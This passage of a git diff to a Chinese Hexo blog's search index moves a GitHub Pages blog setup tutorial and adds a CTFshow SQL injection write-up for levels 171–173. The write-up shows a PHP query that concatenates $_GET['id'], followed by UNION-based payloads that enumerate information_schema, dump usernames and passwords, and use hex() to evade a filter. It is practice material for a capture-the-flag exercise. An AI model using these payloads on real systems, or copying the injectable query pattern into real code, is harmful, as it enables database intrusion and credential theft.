+<p>2、选择一个除C盘外的安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112203141300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后点击next，安装完成：<br><img src="https://img-blog.csdnimg.cn/20210112203231376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、将博客目录拖入sublime：<br><img src="https://img-blog.csdnimg.cn/20210112210759495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Hexo与github连接"><a href="#Hexo与github连接" class="headerlink" title="Hexo与github连接"></a>Hexo与github连接</h1><p>1、在sublime中打开_config.yml，将Deployment改为：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lucifer-rossweisse/lucifer-rossweisse.github.io.git	</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+<p>其中”repo”内填写github仓库中的SSH链接<br><img src="https://img-blog.csdnimg.cn/20210112211302998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、将”url”后改为”<a href="http://github项目名&quot;/">http://github项目名&quot;</a><br><img src="https://img-blog.csdnimg.cn/20210112211442895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、在命令行中输入下列代码，安装插件，上传博客</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">git config --global user.email <span class="string">&quot;github邮箱&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;github用户名&quot;</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+<p>4、在浏览器中输入博客网址，也是github仓库名，即可查看(有时候需要等一会)<br><img src="https://img-blog.csdnimg.cn/20210112211855757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Hexo的主题切换"><a href="#Hexo的主题切换" class="headerlink" title="Hexo的主题切换"></a>Hexo的主题切换</h1><p>其实前面已经把重要的部分整完了，最后就换一个自己喜欢的主题就好了。</p>
+<p>主题可以从github上搜hexo-them进行查找，比较受欢迎的是next和yilia这两个主题，以next为主，之后主题的切换都可以这么来。</p>
+<p>1、进入博客文件夹，打开git bash，输入以下代码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
+<p>安装完后可以看到博客文件夹中的themes里出现了一个next文件夹，这就是我们下载的next主题。<br><img src="https://img-blog.csdnimg.cn/20210112212458400.png"><br>2、修改主题配置文件，进入博客文件夹中的_config.yml修改主题<br><img src="https://img-blog.csdnimg.cn/20210112212618350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后先在本地测试一下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210112212918907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<p>4、最后直接上传发布博客就好了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+<p>注意：hexo在5.0之后把swig给删除了，需要自己手动安装，不然安装next主题后会显示错误<br>输入下面这串代码安装</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>
+<p>然后hexo c清理缓存，hexo g &amp; s即可。</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>全部的搭建步骤已经讲完了，写篇博客其实只是为了记录一下自己学习的搭建过程，如果对你有帮助的话，可以分享给你的朋友哦(￣▽￣)”</p>
 ]]></content>
       <categories>
-        <category>WriteUp</category>
+        <category>hexo</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-        <tag>BUUOJ</tag>
-        <tag>Web</tag>
+        <tag>hexo</tag>
+        <tag>next</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTFshow web入门 sql</title>
+    <url>/2021/02/09/sql/CTF%20show%20web%E5%85%A5%E9%97%A8%20sql/</url>
+    <content><![CDATA[<p>CTFshow web入门 sql注入</p>
+<a id="more"></a>
+<h1 id="sql171"><a href="#sql171" class="headerlink" title="sql171"></a>sql171</h1><p>已给出提示：</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+<p>首先判断注入点</p>
+</blockquote>
+<blockquote>
+<p>id=1’ and 1=1</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/14a98fd34b12ede5b79837c8cb71cee6.png" alt="1"></p>
+<p>没报错也没有显示任何信息，将1=1改为1=2</p>
+<blockquote>
+<p>id=1’ and 1=2</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6618d1687fc6391b7fab913fa7304d6f.png" alt="2"></p>
+<p>还是没有显示任何信息，说明可以使用 ‘ 字符注入</p>
+<p>然后开始判断表有多少列</p>
+<blockquote>
+<p>id=1’ order by 1,2,3 –+</p>
+</blockquote>
+<p>没反应</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/baa7fb6b509789bd13a55341b5ed2ead.png" alt="3"></p>
+<blockquote>
+<p>id=1’ order by 1,2,3,4 –+</p>
+</blockquote>
+<p>出现异常，说明只有三列</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/395e1e2c8fdbcc279cb5cdd97dc5fff3.png" alt="4"></p>
+<p>查询用户，数据库</p>
+<blockquote>
+<p>id=1’ union select 1,user(),database() –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c082ec58008ebb62f2ad28c500341d79.png" alt="5"></p>
+<p>查询该数据库下有哪些表</p>
+<blockquote>
+<p>id=1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’ctfshow_web’),3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/44d780e1a497be20a272bf6ad71e0a67.png" alt="6"></p>
+<p>知道表名就可以查询表里的内容了</p>
+<blockquote>
+<p>id=1’ union select id,username,password from ctfshow_user –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c4aac8c93bb0e44d7dcd3cc474e7da1a.png" alt="7"></p>
+<p>w_user –+</p>
+<p>[外链图片转存中…(img-4ECGGwnL-1612801653075)]</p>
+<p>拿到flag</p>
+<h1 id="sql172"><a href="#sql172" class="headerlink" title="sql172"></a>sql172</h1><p>进入题目后已给出查询语句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>于是根据查询语句构造payload</p>
+<blockquote>
+<p>-1” ‘ union select 1,2,3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210209003048217.png">接着查询表名</p>
+<blockquote>
+<p>-1” ‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/2021020900314130.png"><br>然后查询表中的数据，先查询ctfshow_user</p>
+<blockquote>
+<p>-1” ‘ union select id,username,password from ctfshow_user –+</p>
+</blockquote>
+<p>发现flag不在这里</p>
+<p><img src="https://img-blog.csdnimg.cn/20210209003423518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后查询ctfshow_user2</p>
+<blockquote>
+<p>-1” ‘ union select id,username,password from ctfshow_user2 –+</p>
+</blockquote>
+<p>发现flag<br><img src="https://img-blog.csdnimg.cn/2021020900351314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+<h1 id="sql173"><a href="#sql173" class="headerlink" title="sql173"></a>sql173</h1><p>根据题目给出的查询语句和返回逻辑发现，题目对id,username,password都进行了正则匹配<br>查询资料发现可以通过hex绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, json_encode(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<blockquote>
+<p>-1” ‘ union select hex(id),hex(username),hex(password) from ctfshow_user3 where username=’flag’ –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210209005644675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>将获取的结果进行十六进制解码可以得到flag<br><img src="https://img-blog.csdnimg.cn/2021020900572493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -215,86 +246,6 @@
       <tags>
         <tag>CTF</tag>
         <tag>Nepnep</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>github+hexo搭建个人博客教程</title>
-    <url>/2021/01/12/github+hexo%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<h1 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h1><ul>
-<li>环境搭建<ul>
-<li>安装node.js</li>
-<li>安装git</li>
-<li>安装Hexo</li>
-</ul>
-</li>
-<li>github仓库的创建</li>
-<li>githubSSH的配置</li>
-<li>sublime的安装使用</li>
-<li>Hexo与github连接</li>
-<li>Hexo的主题切换<a id="more"></a>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2></li>
-<li>安装node.js之前请先安装npm并了解相关知识</li>
-</ul>
-<p>Hexo基于node.js,所以我们需要现在计算机中安装<a href="https://nodejs.org/zh-cn/download/">node.js</a>.<br><img src="https://img-blog.csdnimg.cn/20210111144246737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">选择windows64位安装包下载，下载完后一路next就好啦。</p>
-<p>检查node.js是否安装成功，win+r打开命令窗口，输入node -v<br><img src="https://img-blog.csdnimg.cn/20210112111604710.png" alt="node.js 检测"><br>出现版本号即安装成功</p>
-<p>检查npm是否安装成功，在命令窗口下，输入npm -v<br><img src="https://img-blog.csdnimg.cn/20210112111804857.png" alt="npm 检测"><br>出现版本号即安装成功</p>
-<p>好啦，到这里Hexo的环境已经搭建完毕了</p>
-<h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><h3 id="1、git下载"><a href="#1、git下载" class="headerlink" title="1、git下载"></a>1、git下载</h3><p>git的下载可以去官网下载<a href="https://www.git-scm.com/download%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BC%9A%E6%9C%89%E7%82%B9%E6%85%A2%E3%80%82">https://www.git-scm.com/download，但是会有点慢。</a><br>觉得慢的可以去这个网址下载链接：<a href="https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw">https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw</a> 提取码：qivu </p>
-<h3 id="2、git安装"><a href="#2、git安装" class="headerlink" title="2、git安装"></a>2、git安装</h3><p>1、下载完后双击安装程序Git-2.30.0-64-bit，进入安装界面，点击next：<br><img src="https://img-blog.csdnimg.cn/2021011216423378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、选择安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112164344294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、安装配置窗口，包括git命令行、git图形界面等：<br><img src="https://img-blog.csdnimg.cn/20210112164432241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、选择开始菜单文件：<br><img src="https://img-blog.csdnimg.cn/20210112164543529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>5、选择git的默认编译器，推荐vim：<br><img src="https://img-blog.csdnimg.cn/20210112164710774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>6、选择仓库的初始名称，选默认就好了：<br><img src="https://img-blog.csdnimg.cn/20210112164917618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>7、选择可以用windows命令行操作，也可用git bash操作：<br><img src="https://img-blog.csdnimg.cn/20210112165043808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>8、HTTPS传输后台，用默认的就行了：<br><img src="https://img-blog.csdnimg.cn/20210112165228493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>9、选择换行符，默认unix格式，如果检测到windows格式则自动转换为unix格式：<br><img src="https://img-blog.csdnimg.cn/20210112165331786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>10、选择配置默认终端：<br><img src="https://img-blog.csdnimg.cn/20210112165500295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>11、选择git pull风格，推荐默认：<br><img src="https://img-blog.csdnimg.cn/20210112165533960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>12、选择凭据管理，推荐默认选项：<br><img src="https://img-blog.csdnimg.cn/20210112165642464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>13、配置额外的选项，选择文件缓存：<br><img src="https://img-blog.csdnimg.cn/20210112165731109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>14、这是新功能，不推荐选择：<br><img src="https://img-blog.csdnimg.cn/20210112165808234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>15、安装中：<br><img src="https://img-blog.csdnimg.cn/20210112165840223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>16、安装成功辣：<br><img src="https://img-blog.csdnimg.cn/20210112165902939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>17、在任意文件夹中，右键即可选择<br>Git GUI为git图形界面工具<br>Git Bash为命令行工具<br><img src="https://img-blog.csdnimg.cn/20210112170126809.png"></p>
-<h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><h3 id="Hexo安装-1"><a href="#Hexo安装-1" class="headerlink" title="Hexo安装"></a>Hexo安装</h3><p>hexo是我们以后用于搭建个人博客的框架，所以最好先新建一个blog文件夹用于博客的管理，且hexo框架与以后写作发布的网页都会保存在这个文件夹当中。<br>创建好之后，打开命令行，切换至创建的文件夹中：<br><img src="https://img-blog.csdnimg.cn/20210112171614641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>使用npm命令安装hexo，输入：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
-<p>耐心等待安装完成，安装完成之后，先初始化我们的博客，输入：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init bolg</span><br></pre></td></tr></table></figure>
-<p>tips：这些命令必须在我们创建的文件夹中使用。</p>
-<p>此时我们检查一下我们网站的雏形，按顺序输入以下三条命令：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> hello Hexo		<span class="comment">//新建一篇名为“hello Hexo”的博客</span></span><br><span class="line">hexo g					<span class="comment">//生成静态文件</span></span><br><span class="line">hexo s					<span class="comment">//本地部署预览</span></span><br></pre></td></tr></table></figure>
-<p>到这里我们的网站已经初步成型了，可以输入localhost:4000进行访问。</p>
-<h3 id="Hexo的常用命令"><a href="#Hexo的常用命令" class="headerlink" title="Hexo的常用命令"></a>Hexo的常用命令</h3><h4 id="初始化命令"><a href="#初始化命令" class="headerlink" title="初始化命令"></a>初始化命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo -g	<span class="comment">//安装hexo</span></span><br><span class="line">npm update hexo -g	<span class="comment">//更新hexo</span></span><br><span class="line">hexo init	<span class="comment">//初始化博客</span></span><br></pre></td></tr></table></figure>
-<h4 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo n <span class="string">&quot;博客名称&quot;</span> = hexo <span class="keyword">new</span> <span class="string">&quot;博客名称&quot;</span>	<span class="comment">//新建一篇博客</span></span><br><span class="line">hexo g = hexo generate	<span class="comment">//生成</span></span><br><span class="line">hexo s = hexo server	<span class="comment">//启动服务器</span></span><br><span class="line">hexo d = hexo deploy	<span class="comment">//部署</span></span><br></pre></td></tr></table></figure>
-<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo server	<span class="comment">//hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s	<span class="comment">//静态模式</span></span><br><span class="line">hexo server -p <span class="number">5000</span>	<span class="comment">//更改端口</span></span><br><span class="line">hexo server -i <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>	<span class="comment">//自定义 IP地址</span></span><br><span class="line">hexo clean	<span class="comment">//清除缓存，若是网页正常情况下可以忽略这条命令</span></span><br></pre></td></tr></table></figure>
-<h1 id="github仓库的创建"><a href="#github仓库的创建" class="headerlink" title="github仓库的创建"></a>github仓库的创建</h1><p>好了，到这里确保上方操作无误即可进行github仓库的创建(但首先你得先有个github账号哦)。<br>进入github主页，选择左上角的new：<br><img src="https://img-blog.csdnimg.cn/20210112173349599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>进入后输入仓库名称，必须要与owner下的名称一致，输入完后点击创建即可<br>我已经创建过仓库了，所以会提示<br><img src="https://img-blog.csdnimg.cn/20210112173512148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<h1 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h1><p>搭建完仓库后就开始配置githubSSH。</p>
-<p>进入git bash中，按顺序输入如下代码：</p>
-<blockquote>
-<p>git config –global user.email “<a href="mailto:&#120;&#120;&#x78;&#x40;&#x71;&#113;&#x2e;&#99;&#111;&#109;">&#120;&#120;&#x78;&#x40;&#x71;&#113;&#x2e;&#99;&#111;&#109;</a>“    //填写注册github的邮箱</p>
-</blockquote>
-<blockquote>
-<p>git config –global user.name “xxxx”    //github 用户名</p>
-</blockquote>
-<blockquote>
-<p>ssh-keygen    //输入完这个就一致enter就行了</p>
-</blockquote>
-<p>然后进入用户目录下的.ssh，打开id_rsa.pub，复制里面的内容。</p>
-<p>进入github，新建一个SSH就可以了：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210112180408871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<h1 id="sublime的安装使用"><a href="#sublime的安装使用" class="headerlink" title="sublime的安装使用"></a>sublime的安装使用</h1><p>sublime是一个好用的文本编辑器。</p>
-<p>1、sublime下载<br>可以去官网下载：<a href="http://www.sublimetext.com/3">http://www.sublimetext.com/3</a><br>也可以云盘下载：<a href="https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw">https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw</a> 提取码：42pf </p>
-<p>2、选择一个除C盘外的安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112203141300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后点击next，安装完成：<br><img src="https://img-blog.csdnimg.cn/20210112203231376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、将博客目录拖入sublime：<br><img src="https://img-blog.csdnimg.cn/20210112210759495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<h1 id="Hexo与github连接"><a href="#Hexo与github连接" class="headerlink" title="Hexo与github连接"></a>Hexo与github连接</h1><p>1、在sublime中打开_config.yml，将Deployment改为：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lucifer-rossweisse/lucifer-rossweisse.github.io.git	</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-<p>其中”repo”内填写github仓库中的SSH链接<br><img src="https://img-blog.csdnimg.cn/20210112211302998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、将”url”后改为”<a href="http://github项目名&quot;/">http://github项目名&quot;</a><br><img src="https://img-blog.csdnimg.cn/20210112211442895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、在命令行中输入下列代码，安装插件，上传博客</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">git config --global user.email <span class="string">&quot;github邮箱&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;github用户名&quot;</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-<p>4、在浏览器中输入博客网址，也是github仓库名，即可查看(有时候需要等一会)<br><img src="https://img-blog.csdnimg.cn/20210112211855757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
-<h1 id="Hexo的主题切换"><a href="#Hexo的主题切换" class="headerlink" title="Hexo的主题切换"></a>Hexo的主题切换</h1><p>其实前面已经把重要的部分整完了，最后就换一个自己喜欢的主题就好了。</p>
-<p>主题可以从github上搜hexo-them进行查找，比较受欢迎的是next和yilia这两个主题，以next为主，之后主题的切换都可以这么来。</p>
-<p>1、进入博客文件夹，打开git bash，输入以下代码：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
-<p>安装完后可以看到博客文件夹中的themes里出现了一个next文件夹，这就是我们下载的next主题。<br><img src="https://img-blog.csdnimg.cn/20210112212458400.png"><br>2、修改主题配置文件，进入博客文件夹中的_config.yml修改主题<br><img src="https://img-blog.csdnimg.cn/20210112212618350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后先在本地测试一下</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210112212918907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
